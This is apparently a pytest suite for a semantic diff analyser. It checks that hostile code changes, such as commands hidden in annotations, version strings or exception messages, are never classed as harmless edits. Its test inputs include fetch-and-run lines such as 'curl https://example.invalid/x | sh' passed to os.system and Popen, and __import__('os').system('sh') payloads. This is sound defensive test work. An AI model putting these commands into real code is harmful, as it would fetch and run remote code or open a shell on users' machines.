"""A hostile change cannot pass for one that changes no behavior.

The comparison sets aside what only a type checker reads, imports in step with the code using them,
reworded exception messages, a release's version string, and constants a module adds or privately
removes. Each of these regressions is code that does run, or a literal that is code, written to look
like one of them.
"""

from __future__ import annotations

from collections.abc import Callable
from pathlib import Path

import pytest

from semantic_diff_weaver.ast_diff.compare import compare_symbol
from semantic_diff_weaver.ast_diff.extract import extract_symbols
from semantic_diff_weaver.ast_diff.types import StructuralDelta
from semantic_diff_weaver.service import analyze
from semantic_diff_weaver.source import SourceHunk

Factory = Callable[..., tuple[Path, str, str]]

WIDE_HUNK = SourceHunk(id="hunk-001", old_start=1, old_count=400, new_start=1, new_count=400)
PAYLOAD = "    os.system('curl https://example.invalid/x | sh')\n"


def _compare(old: str, new: str, name: str = "<module>") -> list[StructuralDelta]:
    old_symbol, new_symbol = (
        {item.qualified_name: item for item in extract_symbols(source)}[name]
        for source in (old, new)
    )
    return compare_symbol("pkg/mod.py", old_symbol, new_symbol, (WIDE_HUNK,))


@pytest.mark.parametrize(
    ("prelude", "test"),
    [
        pytest.param("TYPE_CHECKING = True\n", "TYPE_CHECKING", id="assigned-true"),
        pytest.param("from evil import TYPE_CHECKING\n", "TYPE_CHECKING", id="imported-elsewhere"),
        pytest.param(
            "from typing import TYPE_CHECKING\nfrom .evil import *\n",
            "TYPE_CHECKING",
            id="star-imported-over",
        ),
        pytest.param(
            "from typing import TYPE_CHECKING\nimport typing\ntyping.TYPE_CHECKING = True\n",
            "TYPE_CHECKING",
            id="patched-attribute",
        ),
        pytest.param(
            "from typing import TYPE_CHECKING\nglobals()['TYPE_CHECKING'] = True\n",
            "TYPE_CHECKING",
            id="rebound-by-name",
        ),
        pytest.param(
            "import typing\nsetattr(typing, 'TYPE_CHECKING', True)\n",
            "typing.TYPE_CHECKING",
            id="patched-by-name",
        ),
        pytest.param("import evil as t\n", "t.TYPE_CHECKING", id="another-module"),
        pytest.param("import typing as t\nt = evil\n", "t.TYPE_CHECKING", id="module-rebound"),
        pytest.param(
            "from typing import TYPE_CHECKING\ndef TYPE_CHECKING():\n    pass\n",
            "TYPE_CHECKING",
            id="defined",
        ),
        pytest.param(
            "from typing import TYPE_CHECKING\nfor TYPE_CHECKING in [True]:\n    pass\n",
            "TYPE_CHECKING",
            id="loop-variable",
        ),
        pytest.param("", "TYPE_CHECKING", id="unbound"),
        pytest.param(
            "from typing import TYPE_CHECKING\ntry:\n    pass\nexcept Exception as TYPE_CHECKING:\n"
            "    pass\n",
            "TYPE_CHECKING",
            id="caught",
        ),
        pytest.param(
            "from typing import TYPE_CHECKING\nmatch os.environ:\n    case {**TYPE_CHECKING}:\n"
            "        pass\n",
            "TYPE_CHECKING",
            id="captured",
        ),
        pytest.param("from typing import TYPE_CHECKING\n", "TYPE_CHECKING or DEBUG", id="or-else"),
    ],
)
def test_code_under_a_type_checking_test_that_may_run_is_compared(prelude: str, test: str) -> None:
    old = f"import os\n{prelude}if {test}:\n    LIMIT = 3\n"
    new = f"import os\n{prelude}if {test}:\n    LIMIT = 3\n{PAYLOAD}"
    kinds = {item.kind for item in _compare(old, new)}
    assert "call_change" in kinds
    assert "structural_refactor" not in kinds


def test_deeply_nested_type_checking_blocks_stay_within_the_budget() -> None:
    """Each block is set aside by recursion, bounded by the AST depth budget like any nesting."""
    depth = 90
    lines = ["from typing import TYPE_CHECKING"]
    for level in range(depth):
        indent = "    " * level
        lines.append(f"{indent}if TYPE_CHECKING:\n{indent}    pass\n{indent}else:")
    lines.append("    " * depth + "LIMIT = 3")
    old = "\n".join(lines) + "\n"
    assert {item.kind for item in _compare(old, old.replace("3", "4"))} == {"assignment_change"}


@pytest.mark.parametrize(
    ("old", "new"),
    [
        pytest.param(
            "os.system('echo one two')", "os.system('curl evil | sh')", id="a-command-raised"
        ),
        pytest.param(
            "ValueError(eval('1 + 1'))",
            "ValueError(eval(\"__import__('os').system('id')\"))",
            id="code-evaluated-for-a-message",
        ),
        pytest.param(
            "subprocess.Popen('ls -la', shell=True)",
            "subprocess.Popen('curl evil | sh', shell=True)",
            id="a-process-raised",
        ),
        pytest.param(
            "ValueError(os.popen('ls -la').read())",
            "ValueError(os.popen('curl evil | sh').read())",
            id="a-command-s-output-for-a-message",
        ),
    ],
)
def test_a_literal_that_runs_is_never_a_reworded_message(old: str, new: str) -> None:
    template = "def fail():\n    raise {}\n"
    kinds = {item.kind for item in _compare(template.format(old), template.format(new), "fail")}
    assert "raise_change" in kinds
    assert "structural_refactor" not in kinds


def test_a_reworded_message_is_shown_redacted() -> None:
    old = "def login(user):\n    raise PermissionError('password=hunter2 is wrong')\n"
    (delta,) = _compare(old, old.replace("is wrong", "was refused"), "login")
    assert delta.metadata.get("reworded") is True
    assert "hunter2" not in f"{delta.old} {delta.new}"


def test_an_import_loaded_for_what_it_does_is_reported(repo_factory: Factory) -> None:
    """A new import nothing reads may run anything when the module loads."""
    code = "def total(items):\n    return sum(items)\n"
    repo, base, head = repo_factory(
        {"shop/cart.py": code}, {"shop/cart.py": f"import shop.payload  # noqa: F401\n\n{code}"}
    )
    result = analyze(
        {"repo_path": str(repo), "base_ref": base, "head_ref": head, "output_format": "json"}
    )
    found = {
        (item["category"], evidence["symbol"])
        for item in result["behavior_changes"]
        for evidence in item["evidence"]
    }
    assert ("unknown_semantic_change", "<module>") in found


TYPING_RULES = ("parameter_annotations", "typing_only", "version_only")


def _passes_for_typing(deltas: list[StructuralDelta]) -> bool:
    return any(item.metadata.get(key) for item in deltas for key in TYPING_RULES)


@pytest.mark.parametrize(
    ("old", "new", "name"),
    [
        pytest.param(
            "import os\n\ndef save(path: int):\n    return path\n",
            "import os\n\ndef save(path: os.system('curl https://example.invalid/x | sh') or int):\n"
            "    return path\n",
            "save",
            id="annotation-that-runs-a-command",
        ),
        pytest.param(
            "str = Payload()\n\ndef save(path: int):\n    return path\n",
            "str = Payload()\n\ndef save(path: str):\n    return path\n",
            "save",
            id="rebound-builtin",
        ),
        pytest.param(
            "import builtins\nsetattr(builtins, 'str', Payload())\n\ndef save(path: int):\n"
            "    return path\n",
            "import builtins\nsetattr(builtins, 'str', Payload())\n\ndef save(path: str):\n"
            "    return path\n",
            "save",
            id="builtin-patched-by-name",
        ),
        pytest.param(
            "from typing import Union\nfrom .payload import *\n\ndef save(path: int):\n"
            "    return path\n",
            "from typing import Union\nfrom .payload import *\n\ndef save(path: Union[int, str]):\n"
            "    return path\n",
            "save",
            id="star-imported-over",
        ),
        pytest.param(
            "@validate_call\ndef save(path: int):\n    return path\n",
            "@validate_call\ndef save(path: Path):\n    return path\n",
            "save",
            id="decorator-reading-annotations",
        ),
        pytest.param(
            "from typing import overload as validate\n\n@validate\ndef save(path: int):\n"
            "    return path\n\nvalidate = check_types\n",
            "from typing import overload as validate\n\n@validate\ndef save(path: str):\n"
            "    return path\n\nvalidate = check_types\n",
            "save",
            id="inert-decorator-rebound",
        ),
    ],
)
def test_an_annotation_that_runs_or_is_read_never_passes_for_typing(
    old: str, new: str, name: str
) -> None:
    assert not _passes_for_typing(_compare(old, new, name))


@pytest.mark.parametrize(
    ("old", "new", "name"),
    [
        pytest.param(
            "from __future__ import annotations\n\nclass Order:\n    total: int = 0\n\n"
            "Order = dataclass(Order)\n",
            "from __future__ import annotations\n\nclass Order:\n    total: str = 0\n\n"
            "Order = dataclass(Order)\n",
            "Order",
            id="class-made-a-dataclass-afterwards",
        ),
        pytest.param(
            "from __future__ import annotations\n\nclass Order:\n    total = 0\n",
            "from __future__ import annotations\n\nclass Order:\n    total = run_payload()\n",
            "Order",
            id="value-that-runs",
        ),
        pytest.param(
            "from .vars import TypeVar\nLIMIT = 3\n",
            "from .vars import TypeVar\nT = TypeVar('T')\nLIMIT = 3\n",
            "<module>",
            id="type-variable-factory-from-elsewhere",
        ),
        pytest.param(
            "from typing import TypeVar\nLIMIT = 3\n\nTypeVar = run_payload\n",
            "from typing import TypeVar\nT = TypeVar('T')\nLIMIT = 3\n\nTypeVar = run_payload\n",
            "<module>",
            id="type-variable-factory-rebound",
        ),
        pytest.param(
            "from typing import TypeVar\nLIMIT = 3\n",
            "from typing import TypeVar\nT = TypeVar('T', bound=__import__('os').system('sh'))\n"
            "LIMIT = 3\n",
            "<module>",
            id="type-variable-argument-that-runs",
        ),
        pytest.param(
            '__version__ = "1.0"\n',
            "__version__ = __import__('os').popen('sh').read()\n",
            "<module>",
            id="version-that-runs",
        ),
    ],
)
def test_code_that_runs_never_passes_for_typing_or_a_version(old: str, new: str, name: str) -> None:
    assert not _passes_for_typing(_compare(old, new, name))


@pytest.mark.parametrize(
    ("old", "new"),
    [
        pytest.param(
            "def size(x):\n    return len(x)\n",
            "len = lambda x: 0\n\n\ndef size(x):\n    return len(x)\n",
            id="a-lambda-shadowing-a-builtin",
        ),
        pytest.param(
            "def size(x):\n    return len(x)\n",
            "len = 0\n\n\ndef size(x):\n    return len(x)\n",
            id="a-constant-shadowing-a-builtin",
        ),
        pytest.param(
            "from .settings import LIMIT\n\n\ndef cap(x):\n    return min(x, LIMIT)\n",
            "from .settings import LIMIT\nLIMIT = 10 ** 9\n\n\ndef cap(x):\n    return min(x, LIMIT)\n",
            id="a-constant-shadowing-an-import",
        ),
        pytest.param(
            "from .settings import *\n",
            "from .settings import *\nLIMIT = 10 ** 9\n",
            id="beside-a-star-import",
        ),
        pytest.param(
            "_HOSTS = ('a.example',)\n\n\ndef allowed(h):\n    return h in _HOSTS\n",
            "\n\ndef allowed(h):\n    return h in _HOSTS\n",
            id="a-removed-constant-still-read",
        ),
        pytest.param("X = 1\n", "X = 1\nY = payload[0]\n", id="an-item-that-may-run-getitem"),
        pytest.param(
            "X = 1\n", "X = 1\nY = payload.attribute\n", id="an-attribute-that-may-run-a-property"
        ),
        pytest.param("X = 1\n", "X = 1\nY = payload | other\n", id="an-operator-that-may-run"),
        pytest.param(
            "import re\nX = 1\n",
            "import re\nX = 1\nP = re.compile('a', __import__('os').system('sh'))\n",
            id="a-pattern-flag-that-runs",
        ),
        pytest.param(
            "import typing\nX = 1\n",
            "import typing\nX = 1\nT = typing.TypeVar('T', bound=__import__('os').system('sh'))\n",
            id="a-type-variable-argument-that-runs",
        ),
        pytest.param(
            "X = 1\n", "X = 1\nY = frozenset(run_payload())\n", id="a-frozenset-of-a-call"
        ),
    ],
)
def test_code_that_runs_or_rebinds_never_passes_for_constants(old: str, new: str) -> None:
    deltas = _compare(old, new)
    assert not any(item.metadata.get("constants_only") for item in deltas)


def test_a_value_changed_past_where_it_is_cut_is_still_compared() -> None:
    """An assignment's value is shown cut at 250 characters, and two values that differed only
    past the cut read the same: a handler swapped at the end of a long table was no assignment
    change, and the module's change one no rule could name."""
    entries = ", ".join(f"'route_{index:02d}': handle_{index:02d}" for index in range(20))
    old = f"HANDLERS = {{{entries}, 'run': run_checked}}\n"
    new = f"HANDLERS = {{{entries}, 'run': run_unchecked}}\n"
    assert len(old) > 300
    (delta,) = _compare(old, new)
    assert delta.kind == "assignment_change"
    assert delta.metadata["assigned_names"] == ["HANDLERS"]
    assert delta.old != delta.new


def test_a_credential_past_the_cut_neither_shows_nor_moves_the_digest() -> None:
    """The digest a cut value ends with is taken of the redacted text: it tells no credential
    apart, as the text shown tells none apart."""
    mirrors = ", ".join(repr(f"https://mirror-{index:02d}.example/simple") for index in range(12))
    tokens = ("ghp_" + "Q" * 36, "ghp_" + "R" * 36)
    texts = [
        symbol.features["assignments"][0][0]
        for token in tokens
        for symbol in extract_symbols(
            f"MIRRORS = [{mirrors}, 'https://ci:{token}@pypi.example/simple']\n"
        )
        if symbol.qualified_name == "<module>"
    ]
    assert texts[0] == texts[1]
    assert "…#" in texts[0]
    assert not any(token[4:] in text for token in tokens for text in texts)
